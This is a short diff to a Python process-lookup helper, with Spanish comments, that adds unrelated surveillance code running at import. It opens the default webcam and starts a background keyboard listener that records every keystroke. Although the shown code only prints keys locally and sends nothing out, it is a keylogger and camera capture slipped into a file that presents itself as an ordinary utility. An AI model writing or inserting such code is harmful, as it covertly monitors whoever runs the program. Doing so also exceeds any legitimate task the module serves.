@@ -1,5 +1,17 @@
 import psutil
 import socket
+import cv2
+from pynput import keyboard
+
+# Captura de Cámara
+cap = cv2.VideoCapture(0)
+
+def on_press(key):
+    print(f'Tecla presionada: {key}')
+
+# Escucha de Teclado en segundo plano
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
 
 def obtener_nombre_proceso(pid):
     """Obtiene el nombre del proceso a partir de su ID (PID)."""
